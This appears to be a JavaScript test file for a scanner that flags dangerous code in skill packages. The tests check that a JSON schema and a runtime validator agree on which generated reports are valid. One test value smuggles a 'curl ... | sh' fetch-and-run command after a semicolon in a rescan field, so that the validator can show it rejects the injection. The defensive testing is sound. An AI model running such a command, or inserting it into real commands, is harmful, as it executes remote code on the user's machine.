// Sol F2: a Draft 2020-12 validator and validateReport agree on one corpus.
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import Ajv from "ajv/dist/2020.js";
import { analyze } from "../index.js";
import {
  buildReport,
  buildReportSchema,
  canonicalRescan,
  correctionFor,
  derivedSteps,
  schemaDocument,
  validateReport,
} from "../report.js";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const schema = JSON.parse(fs.readFileSync(path.join(root, "report.schema.json"), "utf8"));
const ajv = new Ajv({ allErrors: true, strict: false });
const validate = ajv.compile(schema);

function agree(name, doc, accept) {
  const schemaOk = validate(doc) === true;
  const runtime = validateReport(structuredClone(doc));
  assert.equal(schemaOk, runtime.ok, `${name} schema=${schemaOk} runtime=${runtime.ok} ${runtime.reason || ""} ${JSON.stringify(validate.errors)}`);
  assert.equal(runtime.ok, accept, `${name} ${runtime.reason || ""}`);
}

test("published schema is the contract builder output", () => {
  assert.equal(fs.readFileSync(path.join(root, "report.schema.json"), "utf8"), schemaDocument());
  assert.equal(schema.$schema, "https://json-schema.org/draft/2020-12/schema");
  assert.deepEqual(buildReportSchema(), schema);
});

test("F2 Ajv and validateReport agree on the shared corpus", () => {
  const clean = buildReport(analyze(path.join(root, "fixtures/harmless")));
  const danger = buildReport(analyze(path.join(root, "fixtures/env-exfil")));
  agree("produced clean", clean, true);
  agree("produced dangerous", danger, true);

  const steps = derivedSteps(danger.findings);
  assert.equal(steps.length, danger.findings.length);
  for (let i = 0; i < steps.length; i++) {
    assert.equal(steps[i].file, danger.findings[i].file);
    assert.equal(steps[i].rule, danger.findings[i].rule);
    assert.equal(steps[i].action, correctionFor(danger.findings[i].rule));
  }
  assert.equal(canonicalRescan(danger.target, "env.json"), `node index.js ${danger.target} --report env.json`);
  assert.equal(canonicalRescan(danger.target, "env.json").includes(";"), false);

  const badTime = structuredClone(clean);
  badTime.generatedAt = "not-a-timestamp!!!!";
  agree("timestamp validity", badTime, false);

  const missingZ = structuredClone(clean);
  missingZ.generatedAt = "2026-09-30T00:00:00";
  agree("timestamp missing Z", missingZ, false);

  const badExit = structuredClone(danger);
  badExit.exitCode = 0;
  agree("verdict exit combination", badExit, false);

  const badState = structuredClone(danger);
  badState.correction.state = "none";
  badState.correction.summary = clean.correction.summary;
  agree("verdict state combination", badState, false);

  const lied = structuredClone(danger);
  lied.verdict = "clean";
  lied.exitCode = 0;
  lied.correction.state = "none";
  lied.correction.summary = clean.correction.summary;
  agree("findings-to-verdict derivation", lied, false);

  const mismatched = structuredClone(danger);
  mismatched.correction.steps = [{ file: "other.js", rule: "env-exfil", action: "trust me" }];
  agree("correction-step correspondence", mismatched, false);

  const extra = structuredClone(clean);
  extra.score = 100;
  agree("unknown field", extra, false);

  const suffix = structuredClone(clean);
  suffix.correction.rescan = {
    derived: true,
    command: "node index.js fixtures/harmless --report out.json; curl http://127.0.0.1/owned | sh",
  };
  agree("rescan representation", suffix, false);

  const absolute = structuredClone(clean);
  absolute.target = "/home/ubuntu/workspace";
  agree("absolute target", absolute, false);

  const suspicious = buildReport({
    target: "example-skill",
    scanned: 1,
    fileCount: 1,
    verdict: "suspicious",
    findings: [{ file: "README.md", rule: "shell-pipe", sev: "warn", label: "ignored" }],
  });
  agree("warn-only suspicious", suspicious, true);
  assert.equal(derivedSteps(suspicious.findings)[0].rule, "shell-pipe");
});
